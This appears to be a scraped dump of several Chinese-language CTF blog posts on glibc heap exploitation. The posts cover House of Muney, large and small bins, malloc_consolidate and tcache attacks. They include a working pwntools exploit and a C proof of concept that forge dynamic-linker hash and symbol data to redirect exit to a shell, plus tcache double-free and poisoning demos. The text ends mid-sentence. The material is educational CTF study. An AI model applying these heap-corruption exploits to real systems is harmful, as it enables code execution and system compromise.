RTLD_ENABLE_FOREIGN_CALL; #endif // 第一个参数是字符串地址，根据符号表和字符串表得到的 // 第二个参数是link_map // 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表 // 第四个参数是scope，表示查找的范围 // 第五个参数是版本信息 // 后面的参数都是固定的 result = _dl_lookup_symbol_x (strtab + sym-\u0026gt;st_name, l, \u0026amp;sym, l-\u0026gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */ value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); } else { /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; } /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL \u0026amp;\u0026amp; __builtin_expect (ELFW(ST_TYPE) (sym-\u0026gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; // 修正got表条目 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); } 3.调用_dl_lookup_symbol_x 函数 在各个so的link_map寻找对应符号,但是实际调用do_lookup_x函数\nCstatic int __attribute_noinline__ do_lookup_x (const char *undef_name, uint_fast32_t new_hash, unsigned long int *old_hash, const ElfW(Sym) *ref, struct sym_val *result, struct r_scope_elem *scope, size_t i, const struct r_found_version *const version, int flags, struct link_map *skip, int type_class, struct link_map *undef_map) { size_t n = scope-\u0026gt;r_nlist; //r_nlist是动态库link_map的数量，每个动态库都有一个link_map /* Make sure we read the value before proceeding. Otherwise we might use r_list pointing to the initial scope and r_nlist being the value after a resize. That is the only path in dl-open.c not protected by GSCOPE. A read barrier here might be to expensive. */ __asm volatile (\u0026#34;\u0026#34; : \u0026#34;+r\u0026#34; (n), \u0026#34;+m\u0026#34; (scope-\u0026gt;r_list)); struct link_map **list = scope-\u0026gt;r_list;//存放每个link_map的地址数组 do { const struct link_map *map = list[i]-\u0026gt;l_real; //l_real 是 struct link_map 结构体中的一个成员，通常指向该动态链接库实际对应的 link_map。 /* Here come the extra test needed for `_dl_lookup_symbol_skip\u0026#39;. */ if (map == skip) continue; /* Don\u0026#39;t search the executable when resolving a copy reloc. */ if ((type_class \u0026amp; ELF_RTYPE_CLASS_COPY) \u0026amp;\u0026amp; map-\u0026gt;l_type == lt_executable) continue; /* Do not look into objects which are going to be removed. */ if (map-\u0026gt;l_removed) continue; /* Print some debugging info if wanted. */ if (__glibc_unlikely (GLRO(dl_debug_mask) \u0026amp; DL_DEBUG_SYMBOLS)) _dl_debug_printf (\u0026#34;symbol=%s; lookup in file=%s [%lu]\\n\u0026#34;, undef_name, DSO_FILENAME (map-\u0026gt;l_name), map-\u0026gt;l_ns); /* If the hash table is empty there is nothing to do here. */ if (map-\u0026gt;l_nbuckets == 0) continue; Elf_Symndx symidx; int num_versions = 0; const ElfW(Sym) *versioned_sym = NULL; /* The tables for this map. */ // 找到符号表和字符串表（当前link_map） const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]); const ElfW(Sym) *sym; // 获取bitmask const ElfW(Addr) *bitmask = map-\u0026gt;l_gnu_bitmask; if (__glibc_likely (bitmask != NULL)) { // 获取bitmask_word，这里需要伪造，//bitmask_word用来判断new_hash是否哈希表中 // new_hash的计算：int_fast32_t new_hash = _dl_elf_hash (undef_name); // undef_name 符号名称。 ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) \u0026amp; map-\u0026gt;l_gnu_bitmask_idxbits]; unsigned int hashbit1 = new_hash \u0026amp; (__ELF_NATIVE_CLASS - 1); unsigned int hashbit2 = ((new_hash \u0026gt;\u0026gt; map-\u0026gt;l_gnu_shift) \u0026amp; (__ELF_NATIVE_CLASS - 1)); if (__glibc_unlikely ((bitmask_word \u0026gt;\u0026gt; hashbit1) \u0026amp; (bitmask_word \u0026gt;\u0026gt; hashbit2) \u0026amp; 1)) { // 获取bucket，这里需要伪造 // 获取符号所在的桶（bucket） // map-\u0026gt;l_gnu_buckets 是 GNU 哈希表的桶数组 // new_hash % map-\u0026gt;l_nbuckets 计算出符号在桶数组中的索引 // 将该索引对应的桶的值赋给 bucket // 这里代码注释提到需要伪造，可能是在某些特殊调试或模拟场景下的情况 Elf32_Word bucket = map-\u0026gt;l_gnu_buckets[new_hash % map-\u0026gt;l_nbuckets]; if (bucket != 0) { // hasharr，这里也需要伪造对应的值 // 这里注释提到 hasharr 需要伪造对应的值，可能是在某些特殊调试或模拟场景下的情况 // 从 GNU 哈希表的链数组中获取当前桶对应的起始位置 // map-\u0026gt;l_gnu_chain_zero 是 GNU 哈希表的链数组起始地址 // bucket 是前面计算得到的符号所在的桶的索引 // 通过 \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket] 获取该桶对应的链的起始指针 const Elf32_Word *hasharr = \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket]; // 使用 do-while 循环遍历当前桶对应的链，查找匹配的符号 do if (((*hasharr ^ new_hash) \u0026gt;\u0026gt; 1) == 0) // 根据当前链节点的信息计算符号在符号表中的索引 // ELF_MACHINE_HASH_SYMIDX 是一个宏，用于根据不同的 ELF 机器类型计算符号索引 // map 是当前共享对象的 link_map 结构体指针 // hasharr 是当前链节点的指针 symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr); // 调用 check_match 函数检查当前符号是否真正匹配要查找的符号 // undef_name 是要查找的未定义符号的名称 // ref 是引用符号的符号表项指针 // version 用于存储找到的符号的版本信息 // flags 是查找标志，控制查找的行为 // type_class 是符号类型类别 // \u0026amp;symtab[symidx] 是当前可能匹配的符号在符号表中的项 // symidx 是符号在符号表中的索引 // strtab 是字符串表指针，用于获取符号名称 // map 是当前共享对象的 link_map 结构体指针 // \u0026amp;versioned_sym 用于存储版本化符号的信息 // \u0026amp;num_versions 用于存储版本数量信息 sym = check_match (undef_name, ref, version, flags, type_class, \u0026amp;symtab[symidx], symidx, strtab, map, \u0026amp;versioned_sym, \u0026amp;num_versions); // 如果 check_match 函数返回非空指针，说明找到了匹配的符号 if (sym != NULL) { // 跳转到 found_it 标签处，进行后续处理 goto found_it; } } // 移动到链中的下一个节点 // (*hasharr++ \u0026amp; 1u) 用于检查当前链节点是否是链中的最后一个节点 // 如果最后一位为 0，则表示不是最后一个节点，继续循环查找 while ((*hasharr++ \u0026amp; 1u) == 0); } } //.... } #\r利用攻击 #\r利用流程 #\rmalloc \u0026gt; 128k的内存 修改该chunk的size，使其大到能覆盖掉libc的一些地址 free该地址 然后malloc 更大的内存 计算当前chunk的地址到libc的地址距离 （调试得出，第一步malloc时，取libc的地址 - (第四步malloc的地址+0x10)） 计算到布隆过滤器(bitmask)数组的偏移 （.gnu.hash的地址 + 16） 计算到哈希桶(bucket)数组的偏移 ( bloom 的偏移 + bloom_size * 8) 计算bitmask_word的在bitmask中index 计算bitmask_word的地址 获取bitmask_word的值 计算目标符号在哈希桶中的index (exit_hash % 桶数(nbucket)) 计算该bucket的地址 获取buket的值，为目标符号在buket中的值。 计算到l_gnu_chain_zero哈希链数组（GNU 哈希表的链数组起始地址）的距离 计算到目标符号的符号表的偏移 伪造符号表的数据结构，将st_value伪造成目标地址，如one_gadget,system的偏移地址。 为什么不直接伪造st_value,在偷libc的地址的时候，偷到的内存会被清空，所以需要重新伪造。\n某题：exp #\rfrom pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) io = process(\u0026#34;./pwn\u0026#34;) def add(index, size): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;ID:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;size:\u0026#34;, str(size).encode()) def free(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove:\u0026#34;, str(index).encode()) def edit(index, offset, content): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;update:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;length:\u0026#34;, str(offset).encode()) io.sendafter(b\u0026#34;details:\u0026#34;, content) def show(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;view:\u0026#34;, str(index).encode()) def dbg(): gdb.attach(io) pause() add(0, 0x40000 - 0x2000) #dbg() edit(0,-8, p64(0x41002 + 0x5000 + 0x4000)) free(0) add(0, 0x41000 * 2 + 0x4000) base_off = 0x7dff0 one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1] gnu_hash_section = libc.get_section_by_name(\u0026#39;.gnu.hash\u0026#39;) dynsym_section = libc.get_section_by_name(\u0026#39;.dynsym\u0026#39;) dynstr_section = libc.get_section_by_name(\u0026#39;.dynstr\u0026#39;) namehash = gnu_hash_section.gnu_hash(\u0026#39;exit\u0026#39;) # gnu_hash_section[\u0026#39;sh_addr\u0026#39;]获得gun.hash偏移。 bloom_off = gnu_hash_section[\u0026#39;sh_addr\u0026#39;] + 4 * gnu_hash_section._wordsize bucket_off = bloom_off + gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] * gnu_hash_section._xwordsize bloom_elem_idx = int(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize bloom_elem_val = gnu_hash_section.params[\u0026#39;bloom\u0026#39;][bloom_elem_idx] bucket_elem_idx = namehash % gnu_hash_section.params[\u0026#39;nbuckets\u0026#39;] bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize bucket_elem_val = gnu_hash_section.params[\u0026#39;buckets\u0026#39;][bucket_elem_idx] hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[\u0026#39;symoffset\u0026#39;]) * gnu_hash_section._wordsize sym_off = dynsym_section[\u0026#39;sh_offset\u0026#39;] + bucket_elem_val * dynsym_section[\u0026#39;sh_entsize\u0026#39;] sym_value = b\u0026#39;\u0026#39; sym_value += p32(libc.search(b\u0026#39;exit\\x00\u0026#39;).__next__() - dynstr_section[\u0026#39;sh_offset\u0026#39;]) # st_name sym_value += p8(0x12) # st_info 高4位：0x1 表示 STB_GLOBAL（全局符号）低4位：0x2 表示 STT_FUNC（函数类型） sym_value += p8(0) # st_other 通常为0 sym_value += p16(1) # st_shndx 1表示在代码节中 sym_value += p64(one_gadget) # st_value sym_value += p64(100) # st_size 随意设置,动态链接器通常不验证此字段 #dbg() edit(0, base_off + bloom_elem_off, p64(bloom_elem_val)) edit(0, base_off + bucket_elem_off, p32(bucket_elem_val)) edit(0, base_off + hasharr_off, p32(namehash)) edit(0, base_off + sym_off, sym_value) #gdb.attach(io, \u0026#34;b _dl_fixup\\nc\u0026#34;) io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;5\u0026#34;) io.interactive() POC #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; void main() { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0); strcpy(strptr, \u0026#34;/bin/sh\u0026#34;); puts(\u0026#34;[*] step1: allocate a chunk ---\u0026gt; void* ptr = malloc(0x40000);\u0026#34;); size_t *ptr = (size_t *)malloc(0x40000); size_t sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); puts(\u0026#34;[*] step2: change the size of the chunk ---\u0026gt; ptr[-1] += 0x5000;\u0026#34;); ptr[-1] += 0x5000; puts(\u0026#34;[*] step3: free ptr and steal heap from glibc ---\u0026gt; free(ptr);\u0026#34;); free(ptr); puts(\u0026#34;[*] step4: retrieve heap ---\u0026gt; ptr = malloc(0x41000 * 2);\u0026#34;); ptr = malloc(0x41000 * 2); sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); // 当前ptr到原有libc基地址的偏移 size_t base_off = 0x7dff0; // 以下地址均是相对于libc基地址的偏移 size_t system_off = 0x52290; size_t bitmask_word_off = 0xb88; size_t bucket_off = 0xcb0; size_t exit_sym_st_value_off = 0x4d20; size_t hasharr_off = 0x1d7c; puts(\u0026#34;[*] step5: set essential data for dl_runtime_resolve\u0026#34;); *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul; puts(\u0026#34;[*] set bitmask_word to 0xf000028c0200130eul\u0026#34;); *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u; puts(\u0026#34;[*] set bucket to 0x86u\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off; puts(\u0026#34;[*] set exit@sym.st_value to system_off 0x52290\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul; puts(\u0026#34;[*] set other exit@sym members\u0026#34;); *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul; puts(\u0026#34;[*] set hasharr to 0x7c967e3e7c93f2a0ul\u0026#34;); puts(\u0026#34;[*] step6: get shell ---\u0026gt; exit(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#34;); exit(strptr); } ","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-muney/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rLarge bin attack #\rWhat\u0026rsquo;s large bin #\rlarge bin size 大于512字节的chunk称之为large chunk\nlarge bin的数量：63个。Large bin类似于small bin，只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围。\n前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。\nlarge chunk可以添加、删除在large bin的任何一个位置。\n合并操作：类似于small bin。\nmalloc(large chunk)操作：\n​\t初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。\n​\t如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过bitmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。\nFree(large chunk)：类似于small chunk。 Glibc 2.27 large bin attack #\r​\n","externalUrl":null,"permalink":"/posts/pwn/heap/large_bin_attack/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rMemory #\rmalloc #\rmalloc_chunk #\rstruct malloc_chunk { INTERNAL_SIZE_T prev_size; // 前一个 chunk 的大小（如果空闲） INTERNAL_SIZE_T size; // 当前 chunk 的大小，包括头部 struct malloc_chunk* fd; // 指向下一个空闲 chunk struct malloc_chunk* bk; // 指向上一个空闲 chunk struct malloc_chunk* fd_nextsize; // 指向下一个不同大小的空闲 chunk struct malloc_chunk* bk_nextsize; // 指向上一个不同大小的空闲 chunk }; size 字段的二进制结构 位位置（低→高） 名称 描述 第 0 位 PREV_INUSE (P) 前一个 chunk 是否在使用中。 第 1 位 IS_MMAPPED (M) 当前 chunk 是否由 mmap 直接分配（非堆区内存）。 第 2 位 NON_MAIN_ARENA (A) 当前 chunk 是否属于非主分配区（如线程本地堆） malloc_consolidate #\rglibc.2.39源码\nstatic void malloc_consolidate(mstate av) { mfastbinptr* fb; /* current fastbin being consolidated */ mfastbinptr* maxfb; /* last fastbin (for loop control) */ mchunkptr p; /* current chunk being consolidated */ mchunkptr nextp; /* next chunk to consolidate */ mchunkptr unsorted_bin; /* bin header */ mchunkptr first_unsorted; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; atomic_store_relaxed (\u0026amp;av-\u0026gt;have_fastchunks, false); unsorted_bin = unsorted_chunks(av); //获取unsortbin 头 /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren\u0026#39;t immediately going to be reused anyway. */ maxfb = \u0026amp;fastbin (av, NFASTBINS - 1); fb = \u0026amp;fastbin (av, 0); do { p = atomic_exchange_acquire (fb, NULL); if (p != 0) { do { { if (__glibc_unlikely (misaligned_chunk (p))) malloc_printerr (\u0026#34;malloc_consolidate(): \u0026#34; \u0026#34;unaligned fastbin chunk detected\u0026#34;); unsigned int idx = fastbin_index (chunksize (p)); if ((\u0026amp;fastbin (av, idx)) != fb) malloc_printerr (\u0026#34;malloc_consolidate(): invalid chunk size\u0026#34;); } check_inuse_chunk(av, p); nextp = REVEAL_PTR (p-\u0026gt;fd); /* Slightly streamlined version of consolidation code in free() */ size = chunksize (p); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\u0026#34;corrupted size vs. prev_size in fastbins\u0026#34;); unlink_chunk (av, p); } if (nextchunk != av-\u0026gt;top) { nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) { size += nextsize; unlink_chunk (av, nextchunk); } else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-\u0026gt;fd; unsorted_bin-\u0026gt;fd = p; first_unsorted-\u0026gt;bk = p; if (!in_smallbin_range (size)) { p-\u0026gt;fd_nextsize = NULL; p-\u0026gt;bk_nextsize = NULL; } set_head(p, size | PREV_INUSE); p-\u0026gt;bk = unsorted_bin; p-\u0026gt;fd = first_unsorted; set_foot(p, size); } else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; } } while ( (p = nextp) != 0); } } while (fb++ != maxfb); } static void * _int_malloc (mstate av, size_t bytes) { ... ... if ((unsigned long) (nb) \u0026lt;= (unsigned long) (get_max_fast ())) { ... ... } if (in_smallbin_range (nb)) { ... ... } else { idx = largebin_index (nb); if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) malloc_consolidate (av); //chunk大小 \u0026gt; 0x410触发malloc_consolidate。 } 代码逻辑 #\r当chunk大小 \u0026gt;= 0x410 触发 malloc_consolidate()\n1. 初始化 #\r标记 have_fastchunks 为 false：表示 fast bins 即将被清空。 获取 unsorted_bin 头指针：用于后续插入合并后的块。 计算 fast bins 的起始 (fb) 和结束 (maxfb)：遍历所有 fast bins。 2. 遍历 fast bins #\r外层循环：逐个处理从 0 到 NFASTBINS-1 的 fast bin。 原子操作：使用 atomic_exchange_acquire 清空当前 fast bin 的链表，避免多线程竞争。 2.1 校验 chunk 合法性 #\r内存对齐检查：防止攻击者伪造 chunk 元数据。 fast bin 索引验证：确保 chunk 大小与当前 fast bin 匹配。 2.2 合并前向空闲块 #\r检查 prev_inuse 位：若为 0，表示前一个 chunk 空闲。 合并逻辑： 计算前向 chunk 的位置 (p = chunk_at_offset(p, -prevsize)) 验证前向 chunk 的大小是否与 prevsize 一致（防御堆溢出）。 调用 unlink_chunk 从 bin 中移除前向 chunk。 更新当前 chunk 的 size。 2.3 合并后向空闲块 #\r检查 next chunk 是否为 top chunk： 若是，直接合并到 top chunk。 若否，检查 nextinuse 位： 若空闲：合并 next chunk，调用 unlink_chunk。 若在使用中：仅清除 next chunk 的 prev_inuse 位。 2.4 插入 unsorted bin #\r链接到 unsorted bin 头部： 将合并后的块插入 unsorted_bin-\u0026gt;fd。 更新 first_unsorted-\u0026gt;bk 指向新块。 处理 large chunk：若合并后的块大小超出 small bin 范围，清空 fd_nextsize 和 bk_nextsize。 设置元数据： set_head(p, size | PREV_INUSE)：标记当前块大小和 prev_inuse 位。 set_foot(p, size)：设置 next chunk 的 prev_size（仅限空闲块）。 2.5 合并到 top chunk #\r若 next chunk 是 top chunk，直接将合并后的块加入 top，并更新 av-\u0026gt;top 指针。 calloc分配 #\r特性 #\rcalloc不会从fastbins和tcache bin中分配内存（即使请求大小匹配），因为fastbins的chunk可能未合并，无法保证连续空间。 分配时优先从smallbins/unsortedbins或top chunk切割。 calloc从small bin 中拿出一个空闲chunk后，会将其余chunk放入tcache bin 中（直到填满），并且只会检测对第一个 chunk进行了完整性检查，后面的chunk的检查缺失，就造成了fake chunk。 free #\r","externalUrl":null,"permalink":"/posts/pwn/heap/memory_function/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rSmall bin attack #\rWhat\u0026rsquo;s small bin? #\rsmall bin个数：62个，每个small bin也是一个由对应free chunk组成的循环双链表。 small bin采用FIFO(先入先出)算法。 small bin size：第一个chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 62 * 8 = 512字节。 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。 malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理，如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了(还记得上一篇文章中在Top Chunk中留下的问题么？答案就在这里)。注意遍历后续bins以及之后的操作同样被large bin所使用。 free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中。 ","externalUrl":null,"permalink":"/posts/pwn/heap/small_bin_attack/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"\rTcache Attack #\rWhat\u0026rsquo;s Tcache？ #\rGlibc2.26后的缓冲机制。\n遵循LIFO(后进先出)原则，和fastbin、stack一样。、\n程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。\n同一个大小chunk的chunk最多存放7个\nTcache Size 。\nx64: 0x18 \u0026mdash; 0x408\nx86: 0xC \u0026mdash; 0x200\nGlibc2.35以后，出现地址加密机制，fd存放下一个chunk地址异或后的值\n算法：(当前地址 \u0026raquo; 12) xor 当前地址\n这里的key存放在Tcache链中末尾chunk的fd中。\nTcache Double Free #\r利用方式总结 #\r破坏掉被 free 的堆块中的 key，绕过检查（常用） 改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries House of botcake（常用） Tcache dup #\r更改key值 #\r适用glibc 2.29及以上版本。 glibc 2.29增加了新的检测机制\ntypedef struct tcache_entry { struct tcache_entry *next; /* This field exists to detect double frees. */ uintptr_t key; } tcache_entry; #if USE_TCACHE { size_t tc_idx = csize2tidx (size); if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { /* Check to see if it\u0026#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-\u0026gt;key == tcache_key)) { tcache_entry *tmp; size_t cnt = 0; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-\u0026gt;entries[tc_idx]; tmp; tmp = REVEAL_PTR (tmp-\u0026gt;next), ++cnt) { if (cnt \u0026gt;= mp_.tcache_count) malloc_printerr (\u0026#34;free(): too many chunks detected in tcache\u0026#34;); if (__glibc_unlikely (!aligned_OK (tmp))) malloc_printerr (\u0026#34;free(): unaligned chunk detected in tcache 2\u0026#34;); if (tmp == e) malloc_printerr (\u0026#34;free(): double free detected in tcache 2\u0026#34;); /* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ } } ... ... } tcache bin结构\nchunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| previous size |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| Size |A|M|P|\t|\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| fd |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| key |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 只需要更改key的值即可。\n程序演示：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main() { int64_t *ptr=malloc(0x40); free(ptr); ptr[1]=12345; free(ptr); printf(\u0026#34;%p\\n\u0026#34;,malloc(0x40)); printf(\u0026#34;%p\\n\u0026#34;,malloc(0x40)); return 0; } Tcache-poisoning #\rglibc 2.31及版本以下利用 #\r直接伪造next ，注意伪造地址的对齐。\n程序演示：\n#include \u0026lt;stdio.h\u0026gt;s #include \u0026lt;stdint.h\u0026gt; int main() { int64_t *p1=malloc(0x40); int64_t *p2=malloc(0x40); int64_t stack_addr=\u0026#34;deadbeef\u0026#34;; free(p1); free(p2); p2[0]=\u0026amp;stack_addr; printf(\u0026#34;malloc chunk = %p\\n\u0026#34;,malloc(0x40)); printf(\u0026#34;fake chunk = %p\\n\u0026#34;,malloc(0x40)); return 0; } glibc2.31以上版本利用 #\r需要伪造加密后的next，注意伪造地址的对齐。\n算法：(当前地址 \u0026raquo; 12) xor next的地址\n程序演示：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { size_t stack_var[0x10]; size_t *target = NULL; // choose a properly aligned target address for(int i=0; i\u0026lt;0x10; i++) { if(((long)\u0026amp;stack_var[i] \u0026amp; 0xf) == 0) { target = \u0026amp;stack_var[i]; break; } } assert(target != NULL); printf(\u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, target); intptr_t *a = malloc(128); intptr_t *b = malloc(128); free(a); free(b); b[0] = (intptr_t)((long)target ^ (long)b \u0026gt;\u0026gt; 12); printf(\u0026#34;1st malloc(128): %p\\n\u0026#34;, malloc(128)); intptr_t *c = malloc(128); printf(\u0026#34;2nd malloc(128): %p\\n\u0026#34;, c); return 0; } decrypt_safe_linking #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; long decrypt(long cipher) { puts(\u0026#34;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,\u0026#34;); puts(\u0026#34;because of the 12bit sliding.\u0026#34;); puts(\u0026#34;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)\u0026#34;); long key = 0; long plain; for(int i=1; i\u0026lt;6; i++) { int bits = 64-12*i; if(bits \u0026lt; 0) bits = 0; plain = ((cipher ^ key) \u0026gt;\u0026gt; bits) \u0026lt;\u0026lt; bits; key = plain \u0026gt;\u0026gt; 12; printf(\u0026#34;round %d:\\n\u0026#34;, i); printf(\u0026#34;key: %#016lx\\n\u0026#34;, key); printf(\u0026#34;plain: %#016lx\\n\u0026#34;, plain); printf(\u0026#34;cipher: %#016lx\\n\\n\u0026#34;, cipher); } return plain; } int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // step 1: allocate chunks long *a = malloc(0x20); long *b = malloc(0x20); printf(\u0026#34;First, we create chunk a @ %p and chunk b @ %p\\n\u0026#34;, a, b); malloc(0x10); puts(\u0026#34;And then create a padding chunk to prevent consolidation.\u0026#34;); // step 2: free chunks puts(\u0026#34;Now free chunk a and then free chunk b.\u0026#34;); free(a); free(b); printf(\u0026#34;Now the freelist is: [%p -\u0026gt; 